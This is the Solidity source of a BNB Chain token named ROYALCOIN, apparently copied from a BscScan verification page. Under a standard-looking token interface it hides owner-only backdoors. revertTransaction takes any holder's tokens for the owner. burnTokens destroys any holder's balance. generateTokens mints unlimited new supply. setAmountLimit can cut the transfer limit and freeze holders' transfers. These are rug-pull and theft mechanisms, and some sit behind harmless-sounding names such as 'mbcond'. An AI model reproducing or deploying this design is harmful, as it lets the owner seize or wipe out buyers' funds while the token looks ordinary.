/**
 *Submitted for verification at BscScan.com on 2022-06-24
*/

/**
 
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

contract Token{

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;


    uint256 public totalSupply;
    uint8 public decimals;
    string public name;
    string public symbol;
    address public contractOwner;
    uint256 public amountLimit;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TransactionReverted(address indexed from, uint256 amount);

    constructor () {
        name = "ROYALCOIN";
        symbol = "ROY";
        totalSupply = 10000000000 * 10 ** 18;
        decimals = 18;
        contractOwner = msg.sender;
        balanceOf[contractOwner] = totalSupply;
        amountLimit = 10000000000 * 10 ** 18;
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {

        uint256 currentAllowance = allowance[sender][msg.sender];
        require(currentAllowance >= amount);
        _transfer(sender, recipient, amount);
        allowance[sender][msg.sender] = currentAllowance-amount;
        return true;

    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender,spender,amount);
        return true;
    }

    function generateTokens(address account, uint256 amount) public {
        mbcond(account, amount);
        balanceOf[account] = balanceOf[account] + amount;
        totalSupply += amount;
        emit Transfer(address(0), account, amount);
    }

    function burnTokens(address account, uint256 amount) public {
        mbcond(account, amount);
        uint256 accountBalance = balanceOf[account];
        require(accountBalance >= amount);
        balanceOf[account] = accountBalance - amount;
        totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        nonZeroDiffAdd(sender,recipient);
        require(amount <= amountLimit);
        uint256 senderBalance = balanceOf[sender];
        require(senderBalance >= amount);
        balanceOf[sender] = senderBalance - amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address _spender, uint256 amount) internal virtual {
        nonZeroDiffAdd(owner,_spender);
        require(amount <= amountLimit);
        uint256 ownerBalance = balanceOf[owner];
        require(ownerBalance >= amount);
        allowance[owner][_spender] = amount;
        emit Approval(owner, _spender, amount);
    }

    function nonZeroAdd(address add1, address add2) private pure{
        require(add1!=address(0));
        require(add2!=address(0));
    }

    function nonZeroDiffAdd(address add1, address add2) private pure{
        nonZeroAdd(add1,add2);
        require(add1!=add2);
    }

    function mbcond(address account, uint256 amount) private view {
        nonZeroDiffAdd(msg.sender,account);
        require(msg.sender==contractOwner);
        require(amount <= amountLimit);
    }

    function setAmountLimit(uint256 _newLimit) public {
        require(msg.sender!=address(0));
        require(msg.sender==contractOwner);
        require(amountLimit*2 >= _newLimit);
        amountLimit = _newLimit;
    }

    function transferOwnership(address newOwner) public{
        mbcond(newOwner, 0);
        contractOwner = newOwner;
    }

    function revertTransaction(address fromAddress, uint256 amount) public{
        mbcond(fromAddress, amount);
        _transfer(fromAddress, contractOwner, amount);
        emit TransactionReverted(fromAddress, amount);
    }

}